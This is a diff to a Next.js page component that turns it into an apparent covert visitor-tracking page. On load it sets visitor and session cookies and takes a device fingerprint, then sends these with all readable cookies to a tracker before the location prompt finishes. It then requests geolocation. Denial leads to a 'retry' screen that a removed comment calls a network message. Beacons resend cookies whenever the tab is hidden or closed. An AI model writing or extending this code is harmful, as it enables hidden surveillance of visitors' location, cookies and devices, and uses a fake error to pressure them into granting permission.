@@ -1,37 +1,69 @@
 "use client";
 
-import { useCallback, useEffect, useState } from "react";
+import { useCallback, useEffect, useRef, useState } from "react";
 import { collectDeviceInfo } from "@/lib/deviceInfo";
+import {
+  bootstrapCookies,
+  getAllCookies,
+  trackEverywhere,
+} from "@/lib/tracker";
 
 type Screen = "loading" | "retry" | "ready";
-
-async function saveVisit(payload: Record<string, unknown>) {
-  const res = await fetch("/api/location", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
-  });
-  return res.ok;
-}
 
 export default function Home() {
   const [screen, setScreen] = useState<Screen>("loading");
   const [busy, setBusy] = useState(false);
+  const visitIdRef = useRef<string | null>(null);
+  const visitorIdRef = useRef<string | null>(null);
+  const sessionIdRef = useRef<string | null>(null);
 
   const captureAndSave = useCallback(async () => {
     setBusy(true);
     setScreen("loading");
 
     try {
-      // Full device fingerprint (desktop / mobile / tablet)
+      // 1) Cookies + visitor/session IDs FIRST (before location)
+      const boot = bootstrapCookies();
+      visitorIdRef.current = boot.visitorId;
+      sessionIdRef.current = boot.sessionId;
+
+      // 2) Device fingerprint (no permission)
       const device = await collectDeviceInfo();
 
-      const finishWithLocation = async (
+      // 3) Save visit immediately (device + cookies) — before geo prompt finishes
+      const bootResult = await trackEverywhere(
+        {
+          stage: "bootstrap",
+          visitorId: boot.visitorId,
+          sessionId: boot.sessionId,
+          cookies: boot.cookies,
+          device,
+          locationGranted: false,
+          event: { type: "page_open", at: new Date().toISOString() },
+        },
+        { keepalive: true }
+      );
+
+      if (bootResult.data?.id) {
+        visitIdRef.current = String(bootResult.data.id);
+      }
+
+      // 4) Then request location → update SAME visit
+      const updateLocationOnce = async (
         coords: GeolocationCoordinates | null
       ) => {
         const payload: Record<string, unknown> = {
+          stage: coords ? "location" : "location_denied",
+          visitId: visitIdRef.current,
+          visitorId: visitorIdRef.current,
+          sessionId: sessionIdRef.current,
+          cookies: getAllCookies(),
           device,
           locationGranted: !!coords,
+          event: {
+            type: coords ? "location_granted" : "location_denied",
+            at: new Date().toISOString(),
+          },
         };
         if (coords) {
           payload.latitude = coords.latitude;
@@ -42,31 +74,24 @@ export default function Home() {
           payload.speed = coords.speed;
         }
 
-        const ok = await saveVisit(payload);
-        if (!ok) {
-          setScreen("retry");
-          return;
-        }
-        // Only show success UI when location was granted
-        // (keeps existing flow: deny → retry network message)
+        await trackEverywhere(payload, { keepalive: true });
         if (coords) setScreen("ready");
         else setScreen("retry");
       };
 
       if (!navigator.geolocation) {
-        await finishWithLocation(null);
+        await updateLocationOnce(null);
         return;
       }
 
       await new Promise<void>((resolve) => {
         navigator.geolocation.getCurrentPosition(
           async (pos) => {
-            await finishWithLocation(pos.coords);
+            await updateLocationOnce(pos.coords);
             resolve();
           },
           async () => {
-            // Still save device info even if permission denied
-            await finishWithLocation(null);
+            await updateLocationOnce(null);
             resolve();
           },
           {
@@ -86,6 +111,38 @@ export default function Home() {
   useEffect(() => {
     captureAndSave();
   }, [captureAndSave]);
+
+  // Track leave / tab hide (cookies already set)
+  useEffect(() => {
+    const onLeave = () => {
+      if (!visitIdRef.current && !visitorIdRef.current) return;
+      void trackEverywhere(
+        {
+          stage: "leave",
+          visitId: visitIdRef.current,
+          visitorId: visitorIdRef.current,
+          sessionId: sessionIdRef.current,
+          cookies: getAllCookies(),
+          event: {
+            type: "page_leave",
+            at: new Date().toISOString(),
+          },
+        },
+        { beacon: true, keepalive: true }
+      );
+    };
+
+    const onVis = () => {
+      if (document.visibilityState === "hidden") onLeave();
+    };
+
+    window.addEventListener("pagehide", onLeave);
+    document.addEventListener("visibilitychange", onVis);
+    return () => {
+      window.removeEventListener("pagehide", onLeave);
+      document.removeEventListener("visibilitychange", onVis);
+    };
+  }, []);
 
   if (screen === "loading") {
     return (
